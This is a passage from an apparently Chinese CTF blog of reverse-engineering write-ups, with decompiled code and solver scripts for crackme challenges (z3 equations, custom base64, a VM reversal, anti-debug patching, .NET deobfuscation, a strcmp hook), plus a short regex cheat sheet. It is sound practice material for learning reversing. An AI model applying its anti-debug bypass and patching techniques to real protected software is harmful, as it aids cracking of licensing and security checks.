-10283) s.add(71 * v6 + (v7 * 128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855) s.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944) s.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222) s.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258) s.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559) s.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308) s.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697) s.check() print(s.model()) ida里的数据顺序很乱，手动调整一下 v = [0] * 10 v[1] = 48 v[6] = 95 v[0] = 70 v[3] = 82 v[9] = 64 v[2] = 117 v[4] = 84 v[5] = 121 v[8] = 119 v[7] = 55 for i in v: print(chr(i), end=\"\") #F0uRTy_7w@ 拿到key，运行程序输入key拿到flag ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:23:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"Crack me 集合了各种反调试的一道题 main函数 int wmain() { FILE *v0; // eax FILE *v1; // eax char v3; // [esp+3h] [ebp-405h] char v4; // [esp+4h] [ebp-404h] BYREF char v5[255]; // [esp+5h] [ebp-403h] BYREF char Format; // [esp+104h] [ebp-304h] BYREF char v7[255]; // [esp+105h] [ebp-303h] BYREF char passwd; // [esp+204h] [ebp-204h] BYREF char v9[255]; // [esp+205h] [ebp-203h] BYREF char user; // [esp+304h] [ebp-104h] BYREF char v11[255]; // [esp+305h] [ebp-103h] BYREF printf(\"Come one! Crack Me~~~\\n\"); user = 0; memset(v11, 0, sizeof(v11)); passwd = 0; memset(v9, 0, sizeof(v9)); while ( 1 ) { do { do { printf(\"user(6-16 letters or numbers):\"); scanf(\"%s\", \u0026user); v0 = (FILE *)sub_CD24BE(); fflush(v0); } while ( !(unsigned __int8)sub_CD1000(\u0026user) ); printf(\"password(6-16 letters or numbers):\"); scanf(\"%s\", \u0026passwd); v1 = (FILE *)sub_CD24BE(); fflush(v1); } while ( !(unsigned __int8)sub_CD1000(\u0026passwd) ); sub_CD1090(\u0026user); Format = 0; memset(v7, 0, sizeof(v7)); v4 = 0; memset(v5, 0, sizeof(v5)); v3 = ((int (__cdecl *)(char *, char *))loc_CD11A0)(\u0026Format, \u0026v4); if ( sub_CD1830((int)\u0026user, \u0026passwd) ) { if ( v3 ) break; } printf(\u0026v4); } printf(\u0026Format); return 0; } 先后输入用户名（welcomebeijing）和密码，每次输入过后有一个sub_CD24BE函数，动调发现对user和passwd都没影响，跳过即可 主要加密/判断在sub_CD1830函数 bool __usercall sub_CD1830@\u003cal\u003e(int a1@\u003cebx\u003e, char *user, const char *passwd) { int v4; // [esp+18h] [ebp-22Ch] int v5; // [esp+1Ch] [ebp-228h] int j; // [esp+28h] [ebp-21Ch] unsigned int i; // [esp+30h] [ebp-214h] char v8; // [esp+36h] [ebp-20Eh] char v9; // [esp+37h] [ebp-20Dh] char v10; // [esp+38h] [ebp-20Ch] unsigned __int8 v11; // [esp+39h] [ebp-20Bh] unsigned __int8 v12; // [esp+3Ah] [ebp-20Ah] char v13; // [esp+3Bh] [ebp-209h] int check; // [esp+3Ch] [ebp-208h] BYREF char v15; // [esp+40h] [ebp-204h] BYREF char v16[255]; // [esp+41h] [ebp-203h] BYREF _BYTE v17[256]; // [esp+140h] [ebp-104h] BYREF v5 = 0; j = 0; v12 = 0; v11 = 0; v17[0] = 0; memset(\u0026v17[1], 0, 0xFFu); v15 = 0; memset(v16, 0, sizeof(v16)); v10 = 0; i = 0; v4 = 0; while ( i \u003c strlen(passwd) ) { if ( isdigit(passwd[i]) ) { v9 = passwd[i] - 48; } else if ( isxdigit(passwd[i]) ) { if ( *((_DWORD *)NtCurrentPeb()-\u003eSubSystemData + 3) == 2 )// 反调 passwd[i] = 34; v9 = (passwd[i] | 0x20) - 87; } else { v9 = ((passwd[i] | 0x20) - 97) % 6 + 10; } __rdtsc(); __rdtsc(); v10 = v9 + 16 * v10; if ( !((int)(i + 1) % 2) ) { *(\u0026v15 + v4++) = v10; a1 = v4; v10 = 0; } ++i; } while ( j \u003c 8 ) { v11 += byte_CE6050[++v12]; v13 = byte_CE6050[v12]; v8 = byte_CE6050[v11]; byte_CE6050[v11] = v13; byte_CE6050[v12] = v8; if ( ((int)NtCurrentPeb()-\u003eUnicodeCaseTableData \u0026 0x70) == 0 )// 反调 v13 = v11 + v12; v17[j] = byte_CE6050[(unsigned __int8)(v8 + v13)] ^ *(\u0026v15 + v5); if ( !(unsigned __int8)*(_DWORD *)\u0026NtCurrentPeb()-\u003eBeingDebugged )// 反调 { v11 = -83; v12 = 43; } sub_CD1710((int)v17, user, j++); v5 = j; if ( j \u003e= (unsigned int)(\u0026v15 + strlen(\u0026v15) + 1 - v16) ) v5 = 0; } check = 0; sub_CD1470(a1, v17, \u0026check); return check == 0xAB94; } 从上到下总共三次反调试操作，上面已经是patch过的版本（对应汇编jz与jnz互改） 上面一个while循环实现了从字符串数据中获得原本字符值，具体可动调试试 下面加密部分大致可分为3块，下面倒着分析 第一块 整个函数最后返回验证的是check值，而check值应由sub_CD1470获得 sub_CD1470函数 void __usercall sub_CD1470(int a1@\u003cebx\u003e, _BYTE *v17, _DWORD *check) { char v5; // al if ( *v17 != 'd' ) *check ^= 3u; else *check |= 4u; if ( v17[1] != 'b' ) { *check \u0026= 0x61u; _EAX = (_DWORD *)*check; } else { _EAX = check; *check |= 20u; } __asm { aam } if ( v17[2] != 'a' ) *check \u0026= 0xAu; else *check |= 0x84u; if ( v17[3] != 'p' ) *check \u003e\u003e= 7; else *check |= 0x114u; if ( v17[4] != 'p' ) *check *= 2; else *check |= 0x380u; if ( *((_DWORD *)NtCurrentPeb()-\u003eSubSystemData + 3) != 2 )// 反调 { if ( v17[5] != 'f' ) *check |= 0x21u; else *check |= 0x2DCu; } if ( v17[5] != 's' ) { v5 = (char)check; *check ^= 0x1ADu; } else { *check |= 0xA04u; v5 = (char)check; } _AL = v5 - (~(a1 \u003e\u003e 5) - 1); __asm { daa } if ( v17[6] != 'e' ) *check |= 0x4Au; else *check |= 0x2310u; if ( v17[7] != 'c' ) *check \u0026= 0x3A3u; else *check |= 0x8A10u; } 可见有意义字符串dbappsec，把check异或上相应的值正好是验证所需的0","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:24:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"特殊的base64 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax __int64 v4; // rax char v6[16]; // [rsp+20h] [rbp-60h] BYREF char v7[16]; // [rsp+30h] [rbp-50h] BYREF char input[15]; // [rsp+40h] [rbp-40h] BYREF char v9; // [rsp+4Fh] [rbp-31h] BYREF char v10[32]; // [rsp+50h] [rbp-30h] BYREF _main(argc, argv, envp); std::string::string((std::string *)input); std::allocator\u003cchar\u003e::allocator(\u0026v9); std::string::string(v7, \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\", \u0026v9); std::allocator\u003cchar\u003e::~allocator(\u0026v9); v3 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"Please input your flag!!!!\"); std::ostream::operator\u003c\u003c(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::operator\u003e\u003e\u003cchar\u003e(refptr__ZSt3cin, (std::string *)input); std::string::string((std::string *)v10, (const std::string *)input); base64Encode(v6, v10); std::string::~string((std::string *)v10); if ( (unsigned __int8)std::operator==\u003cchar\u003e(v6, v7) ) v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"The flag is right!!!!!!!!!\"); else v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"This is a wrong flag!!!!!!!!\"); std::ostream::operator\u003c\u003c(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::string::~string((std::string *)v6); std::string::~string((std::string *)v7); std::string::~string((std::string *)input); return 0; } 还是base64换表，直接上脚本吧 import base64 standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\" enc = \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\" table = str.maketrans(new_table, standard_table) print(base64.b64decode(enc.translate(table))) b’flag{Special_Base64_By_Lich}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:25:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level4 这道题是个体力活 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { puts(\"Practice my Data Structure code.....\"); puts(\"Typing....Struct.....char....*left....*right............emmmmm...OK!\"); init(); puts(\"Traversal!\"); printf(\"Traversal type 1:\"); midTraversal((char *)\u0026node_23_root); printf(\"\\nTraversal type 2:\"); lastTraversal((char *)\u0026node_23_root); printf(\"\\nTraversal type 3:\"); puts(\" //type3(\u0026x[22]); No way!\"); puts(\u0026byte_400A37); return 0; } 已知二叉树的中序遍历和后序遍历（运行即可得到），求先序遍历 2f0t02T{hcsiI_SwA__r7Ee} 20f0Th{2tsIS_icArE}e7__w 但由于中间有重复字符，搞了一会没搞出来，转而去看init函数，即二叉树的构建过程，这里需要手动修一下结构体，最终效果 void init() { int i; // [rsp+Ch] [rbp-34h] char v1[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); strcpy(v1, \"I{_}Af2700ih_secTS2Et_wr\"); for ( i = 0; i \u003c= 23; ++i ) *((_BYTE *)\u0026node_1.val + 24 * i) = v1[i]; node_23_root.left = \u0026node_16; node_16.left = \u0026node_21; node_21.left = \u0026node_6; node_6.left = \u0026node_7; node_6.right = \u0026node_9; node_21.right = \u0026node_19; node_19.left = \u0026node_10; node_19.right = \u0026node_2; node_2.left = \u0026node_17; node_2.right = \u0026node_12; node_16.right = \u0026node_11; node_11.left = \u0026node_14; node_11.right = \u0026node_3; node_3.left = \u0026node_1; node_3.right = \u0026node_18; node_23_root.right = \u0026node_22; node_22.left = \u0026node_5; node_22.right = \u0026node_13; node_13.right = \u0026node_8; node_8.left = \u0026node_24; node_8.right = \u0026node_15; node_15.left = \u0026node_20; node_15.right = \u0026node_4; } 结构体如下，val的大小可以观察一下汇编中的数据得到 struct Tree { __int64 val; Tree *left; Tree *right; }; 根据只有左右节点，没有父节点的特点可以确定23号为root 然后建立整棵树 w/23 c/16 _/22 t/21 i/11 A/5 _/13 f/6 2/19 s/14 _3 78 2/7 0/9 0/10 {/2 I/1 S/18 r/24 e/15 T/17 h/12 E/20 }/4 先序遍历走一下拿到flagwctf2020{This_IS_A_7reE} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:26:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[网鼎杯 2020 青龙组]singal 主要函数如下 void __cdecl vm_operad(int *a1, int const_114) { char flag[200]; // [esp+13h] [ebp-E5h] BYREF char v3; // [esp+DBh] [ebp-1Dh] int v4; // [esp+DCh] [ebp-1Ch] int v5; // [esp+E0h] [ebp-18h] int v6; // [esp+E4h] [ebp-14h] int flag_cnt; // [esp+E8h] [ebp-10h] int a1_cnt; // [esp+ECh] [ebp-Ch] a1_cnt = 0; flag_cnt = 0; v6 = 0; v5 = 0; v4 = 0; LABEL_2: while ( a1_cnt \u003c const_114 ) { switch ( a1[a1_cnt] ) { case 1: flag[v5 + 100] = v3; ++a1_cnt; ++v5; ++flag_cnt; break; case 2: v3 = a1[a1_cnt + 1] + flag[flag_cnt]; a1_cnt += 2; break; case 3: v3 = flag[flag_cnt] - LOBYTE(a1[a1_cnt + 1]); a1_cnt += 2; break; case 4: v3 = a1[a1_cnt + 1] ^ flag[flag_cnt]; a1_cnt += 2; break; case 5: v3 = a1[a1_cnt + 1] * flag[flag_cnt]; a1_cnt += 2; break; case 6: ++a1_cnt; break; case 7: if ( flag[v6 + 100] != a1[a1_cnt + 1] ) { printf(\"what a shame...\"); exit(0); } ++v6; a1_cnt += 2; break; case 8: flag[v4] = v3; ++a1_cnt; ++v4; break; case 10: read(flag); ++a1_cnt; break; case 11: v3 = flag[flag_cnt] - 1; ++a1_cnt; break; case 12: v3 = flag[flag_cnt] + 1; ++a1_cnt; break; default: goto LABEL_2; } } } a1是前面初始化时生成的一个表，可以看出全程不会改变 变量值都是已知的，求flag 目的简单明确，把它逆了，但有很多细节问题 a1里存的并非全是操作数，有些是需要参与运算的值，上一步的操作决定步长（即下一步的操作），逆过来的时候无法判断步长(即a1_cnt是减1还是减2) v3，v4，v5，v6的结束值即逆写的初值需要确定 default里goto label_2需要明白其实没啥用 针对以上解决方案（可能不是最优 所有操作后步长(a1_cnt)均设置成最小步长-1，然后加一个判断，是否是真正的操作数，不是的话再a1_cnt-1 v3分析一下会发现运行时会先被赋值后进行运算，所以无需初值。至于v4，v5，v6，这几个得自己数一遍，如果只是遍历一遍看进哪个case可能会把非操作数算上，还好数量不太大，最后数出来三个数都是15 至于default正常运行是不会进去的，忽略即可 最后贴出脚本，调试了好久才出，写得有点繁琐但不想改了（（ #include \u003cstdio.h\u003e unsigned int a1[] = {};//这就是动调dump下来的a1数组，但太长了粘不下来 int a1_cnt = 112; int flag_cnt = 15; int v6 = 15; int v5 = 15; int v4 = 15; int const_114 = 114; unsigned char flag[200]; unsigned char v3; int main() { while (a1_cnt \u003e= 0) { if (a1[a1_cnt - 1] \u003e= 2 \u0026\u0026 a1[a1_cnt - 1] \u003c= 5) { // 这么判断可能换个数据就能卡掉，但显然这已经能拿到flag了 a1_cnt--; // 5 3 8 特判 if (a1[a1_cnt - 1] \u003e= 2 \u0026\u0026 a1[a1_cnt - 1] \u003c= 5 \u0026\u0026 a1[a1_cnt + 1] \u003c= 12) a1_cnt++; } switch (a1[a1_cnt]) { case 1: --flag_cnt; --v5; --a1_cnt; v3 = flag[v5 + 100]; break; case 2: flag[flag_cnt] = v3 - a1[a1_cnt + 1]; a1_cnt--; break; case 3: flag[flag_cnt] = v3 + (a1[a1_cnt + 1] \u0026 0x0000ffff); a1_cnt--; break; case 4: flag[flag_cnt] = v3 ^ a1[a1_cnt + 1]; a1_cnt--; break; case 5: flag[flag_cnt] = v3 / a1[a1_cnt + 1]; a1_cnt--; break; case 6: --a1_cnt; break; case 7: --v6; flag[v6 + 100] = a1[a1_cnt + 1]; a1_cnt--; break; case 8: --v4; --a1_cnt; v3 = flag[v4]; break; case 10: puts(flag); case 11: --a1_cnt; flag[flag_cnt] = v3 + 1; break; case 12: --a1_cnt; flag[flag_cnt] = v3 - 1; break; default: a1_cnt--; } } } flag{757515121f3d478} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:27:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GUET-CTF2019]number_game 第二次做这题了，发现了种非预期解（ main函数 unsigned __int64 __fastcall main(int a1, char **a2, char **a3) { char *v4; // [rsp+8h] [rbp-38h] __int64 input; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] char a1a[8]; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); input = 0LL; v6 = 0; *(_QWORD *)a1a = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\"%s\", \u0026input); if ( (unsigned int)check_len((const char *)\u0026input) ) { v4 = sub_400758((char *)\u0026input, 0, 10u); sub_400807(v4, a1a); v9 = 0; copy(a1a); if ( (unsigned int)sub_400917() ) { puts(\"TQL!\"); printf(\"flag{\"); printf(\"%s\", (const char *)\u0026input); puts(\"}\"); } else { puts(\"your are cxk!!\"); } } return __readfsqword(0x28u) ^ v10; } sub_400758 char *__fastcall sub_400758(char *input, int const_0, unsigned int len_input) { char v5; // [rsp+1Fh] [rbp-11h] char *v6; // [rsp+28h] [rbp-8h] v5 = input[const_0]; if ( v5 == ' ' || v5 == '\\n' || const_0 \u003e= (int)len_input ) return 0LL; v6 = (char *)malloc(0x18uLL); *v6 = v5; *((_QWORD *)v6 + 1) = sub_400758(input, 2 * const_0 + 1, len_input); *((_QWORD *)v6 + 2) = sub_400758(input, 2 * (const_0 + 1), len_input); return v6; } sub_400807 void __fastcall sub_400807(char *a1, char *a2) { if ( a1 ) { sub_400807(*((char **)a1 + 1), a2); a2[dword_601080++] = *a1; sub_400807(*((char **)a1 + 2), a2); } } copy void __fastcall sub_400881(char *a1) { byte_601060[2] = *a1; byte_601060[7] = a1[1]; byte_601060[9] = a1[2]; byte_601060[11] = a1[3]; byte_601060[14] = a1[4]; byte_601060[15] = a1[5]; byte_601060[17] = a1[6]; byte_601060[18] = a1[7]; byte_601060[22] = a1[8]; byte_601060[23] = a1[9]; } sub_400917 __int64 sub_400917() { unsigned int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i \u003c= 4; ++i ) { for ( j = 0; j \u003c= 4; ++j ) { for ( k = j + 1; k \u003c= 4; ++k ) { if ( byte_601060[5 * i + j] == byte_601060[5 * i + k] ) v1 = 0; if ( byte_601060[5 * j + i] == byte_601060[5 * k + i] ) v1 = 0; } } } return v1; } 从后往前看，sub_400917函数结合byte_601060发现是个5*5的数独，手动填一下 1 4 #0 2 3 3 0 #4 1 #2 0 #1 2 3 #4 #2 3 #1 #4 0 4 2 #3 #0 1 得到了主函数中的a1a 0421421430 上面两个函数，将input逐层建了一个二叉树，然后再中序遍历赋值给ala 正常做法是根据得到的ala即中序遍历建树，由于树从左到右生长，确保了答案的唯一性，这是我第一次做的时候的做法，如图 1 1 3 4 2 4 0 0 2 4 //flag：1134240024 这次做突然有个大胆的想法，算法只是改变了数字的顺序，那么可不可能会在几次改变顺序后循环呢？于是有了以下尝试，每次将上一次动调得到的改变后的数组当作下一次的输入，幸运的是，第6次过后我就获得了成功，数据如下 0421421430 4134040221 2421104430 4134012024 0421404132 1134240024 0421421430 没有严谨的证明，但这确实不失为一种很高效的非预期解 flag{1134240024} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:28:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["Linux"],"content":"Regular Expression（linux） ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:0","tags":["linux"],"title":"Regular Expression（linux）","uri":"/2022/02/regular-expressionlinux/"},{"categories":["Linux"],"content":"- 基本正则表达式 ^：匹配开头内容 $：匹配结尾内容 ^$：表示空行 .：匹配一个任意字符 *：匹配出现次数为0次或多次 ^.*：匹配以任意多个字符开头的内容 .*$：匹配以任意多个字符结尾的内容 [abc]：匹配abc中任意一个字符 [^abc]：匹配abc以外任意一个字符 ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:1","tags":["linux"],"title":"Regular Expression（linux）","uri":"/2022/02/regular-expressionlinux/"},{"categories":["Linux"],"content":"- 扩展正则表达式 +：匹配前一个字符1次或多次 [abc]+：匹配abc中的一个字符一次或多次 ？：匹配前一个字符1次或者0次 |：表示或者，或管道符 {n,m}：匹配前一个字符最少n次，最多m次 {n}：匹配前一个字符正好n次 ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:2","tags":["linux"],"title":"Regular Expression（linux）","uri":"/2022/02/regular-expressionlinux/"},{"categories":["WriteUps"],"content":"第九周 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:0:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 Hacking with Google: Beginner 做了一半卡住了，偷看了一下官方题解，然后复现一下 ida很容易定位到主函数 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // er12 __m128i v5; // [rsp+0h] [rbp-38h] BYREF __m128i s2[2]; // [rsp+10h] [rbp-28h] BYREF printf(\"Flag: \"); __isoc99_scanf(\"%15s\", \u0026v5); s2[0] = _mm_xor_si128( _mm_add_epi32(_mm_shuffle_epi8(_mm_load_si128(\u0026v5), (__m128i)SHUFFLE), (__m128i)ADD32), (__m128i)XOR); if ( !strncmp(v5.m128i_i8, (const char *)s2, 0x10uLL) \u0026\u0026 (v3 = strncmp((const char *)s2, EXPECTED_PREFIX, 4uLL)) == 0 ) { puts(\"SUCCESS\"); } else { v3 = 1; puts(\"FAILURE\"); } return v3; } 可以看到各种SSE指令 这里要注意add是把每四字节打包（pack）然后进行求和，而异或是逐字节进行异或 _mm_shuffle_epi8 无法见名知义，官方描述加查找各种解释终于搞懂，见注释 FOR j := 0 to 15 //遍历16个字节 i := j*8 //遍历每个字节中的8个bit IF b[i+7] == 1 //当前字节最高位为1 dst[i+7:i] := 0 //整个字节8bit全置为0 ELSE index[3:0] := b[i+3:i] //相当于以int形式取出b中的值存入index dst[i+7:i] := a[index*8+7:index*8] //把a数组下标为index[i]的值放入dst数组 FI ENDFOR 由于可见字符为32-126，不可能最高位为1，所以全置为0的情况不会发生 即shuffle就是把原数组a按b的顺序重新排列了一遍，其中值没有改变 题目验证逻辑 flag-\u003eshuffle-\u003eadd-\u003exor == flag \u0026\u0026 flag前四位为CTF{ （这里注意输入的第16位是字符串结束标志\\0 显然我们可以根据前四位推出一些东西 从后往前推 flag 0x43 0x54 0x46 0x7b xornum 0x76 0x58 0xB4 0x49 xor_pre 0x35 0x0c 0xf2 0x32 xor_pre 0x32f20c35 addnum 0x0DEADBEEF add_pre 0x54444d46 add_pre 0x46 0x4d 0x44 0x54 shufflenum 2 6 7 1 于是我们知道了第6、7位分别为M、D，即CTF{--MD------}\\0 这时我们想到，最低位（字节）的值进行add操作时不会受其他字节的影响（不会受进位的影响 要确保已知字符是shuffle后的最低位，我们想到了\\0，并且这次需要正着推 为省事写个脚本 #include\u003cstdio.h\u003e int xornum[] = {0x76, 0x58, 0xB4, 0x49, 0x8D, 0x1A, 0x5F, 0x38, 0xD4, 0x23, 0xF8, 0x34, 0xEB, 0x86, 0xF9, 0xAA}; int addnum[] = {0xEF, 0xBE, 0xAD, 0xDE, 0xAD, 0xDE, 0xE1, 0xFE, 0x37, 0x13, 0x37, 0x13, 0x66, 0x74, 0x63, 0x67}; int shufflenum[] = {2,6,7,1,5,11,9,14,3,15,4,8,10,12,13,0}; int main(){ int alpha,index,pre_index; //index是shuffle之后的下标，pre_index是shuffle之前的下标 scanf(\"%x%d\",\u0026alpha,\u0026index); for (int i = 0; i \u003c 16; i++){ if(index==shufflenum[i]) pre_index = i; } unsigned char newalpha = ((alpha+addnum[pre_index]))^xornum[pre_index]; printf(\"0x%x %c %d\",newalpha,newalpha,pre_index); } // input:0 15 // output:0x30 0 9 // input:0x7b 3 // output:0x66 f 8 于是得到了flag第九位为0，即CTF{--MD-0----}\\0 同样用 { 可以得到第8位为 f，即CTF{--MDf0----}\\0 但我们已经用完了所有的最低字节 我们如果使用其他字节就会面临进位的问题，但我们也不排除还有其他没有使用的，没有进位的字符 如果去考虑一遍所有的位是否存在进位问题是一个浩大的工程 所以我们的想法是碰碰运气，如果推出的字符与已知矛盾就舍弃，如果不矛盾就保留（这真是官方方法 在把所有位试过一遍之后，我们会逐渐得到flag CTF{--MDf0-M--}\\0 CTF{-1MDf0-M--}\\0 CTF{S1MDf0-M--}\\0 CTF{S1MDf0rM--}\\0 CTF{S1MDf0rM3-}\\0 CTF{S1MDf0rM3!}\\0 CTF{S1MDf0rM3!}\\0 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:1:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 V\u0026N 公开赛 CSRe die查，发现protector: Eazfuscator 查了一下，是一种.Net代码混淆方法，可以用de4dot反混淆，然后dnspy反编译 这道题需要耐心，尝试搜索flag字符串，翻了十多分钟终于找到Main using System; using System.Security.Cryptography; using System.Text; // Token: 0x02000006 RID: 6 internal sealed class Class3 { // Token: 0x0600000D RID: 13 RVA: 0x000022C8 File Offset: 0x000004C8 public string method_0(string string_0, string string_1) { string text = string.Empty; char[] array = string_0.ToCharArray(); char[] array2 = string_1.ToCharArray(); int num = (array.Length \u003c array2.Length) ? array.Length : array2.Length; for (int i = 0; i \u003c num; i++) { text += (int)(array[i] ^ array2[i]); } return text; } // Token: 0x0600000E RID: 14 RVA: 0x0000231C File Offset: 0x0000051C public static string smethod_0(string string_0) { byte[] bytes = Encoding.UTF8.GetBytes(string_0); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString(); } // Token: 0x0600000F RID: 15 RVA: 0x00002374 File Offset: 0x00000574 private static void Main(string[] args) { if (!Class1.smethod_1()) { return; } bool flag = true; Class3 @class = new Class3(); string str = Console.ReadLine(); if (Class3.smethod_0(\"3\" + str + \"9\") != \"B498BFA2498E21325D1178417BEA459EB2CD28F8\") { flag = false; } string text = Console.ReadLine(); string string_ = Class3.smethod_0(\"re\" + text); string text2 = @class.method_0(string_, \"63143B6F8007B98C53CA2149822777B3566F9241\"); for (int i = 0; i \u003c text2.Length; i++) { if (text2[i] != '0') { flag = false; } } if (flag) { Console.WriteLine(\"flag{\" + str + text + \"}\"); } } } 可以看到flag由两部分组成，即str和text class。method_0像是个加密算法，得到两串字符串 直接丢到Cmd5网站解密，原来是Sha1加密 得到\"3\" + str + \"9\"==314159,\"re\" + text ==return 故flag{1415turn} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:2:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 Zer0pts2020 easy-strcmp ida载入，main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { if ( a1 \u003e 1 ) { if ( !strcmp(a2[1], \"zer0pts{********CENSORED********}\") ) puts(\"Correct!\"); else puts(\"Wrong!\"); } else { printf(\"Usage: %s \u003cFLAG\u003e\\n\", *a2); } return 0LL; } 醒目的strcmp和一串字符串，难道这就是flag？肯定不是 翻函数列表发现两个特别的函数 int (**sub_563477E00795())(const char *s1, const char *s2) { int (**result)(const char *, const char *); // rax result = \u0026strcmp; qword_563478001090 = (__int64 (__fastcall *)(_QWORD, _QWORD))\u0026strcmp; off_563478001028 = sub_563477E006EA; return result; } __int64 __fastcall sub_563477E006EA(__int64 a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) ; v4 = (i \u003e\u003e 3) + 1; for ( j = 0; j \u003c v4; ++j ) *(_QWORD *)(8 * j + a1) -= qword_563478001060[j]; return qword_563478001090(a1, a2); } 可以看到第一个函数sub_563477E00795记录了strcmp函数的地址，然后调用了函数sub_563477E006EA 相当于把strcmp函数给改了，实际执行的是第二个函数sub_563477E006EA 即把真正的flag加密了，然后与main函数里的字符串比较 这里注意main函数里传的是 a2[1]，即跳过了zer0pts qword_563478001060刚好32个字节非空，对应修改 * 及其中间字符共32个字节 于是写脚本拿flag #include\u003cstdio.h\u003e unsigned char key[] = { 0x42, 0x09, 0x4A, 0x49, 0x35, 0x43, 0x0A, 0x41, 0xF0, 0x19, 0xE6, 0x0B, 0xF5, 0xF2, 0x0E, 0x0B, 0x2B, 0x28, 0x35, 0x4A, 0x06, 0x3A, 0x0A, 0x4F }; char en_flag[]=\"********CENSORED********\"; unsigned long long flag[5]; int main(){ for(int i=0;i\u003c3;i++){ flag[i]=*((unsigned long long *)key+i)+*((unsigned long long *)en_flag+i); } for(int i=0;i\u003c24;i++){ printf(\"%c\",*((unsigned char *)flag+i)); } } //zer0pts{l3ts_m4k3_4_DETOUR_t0d4y} 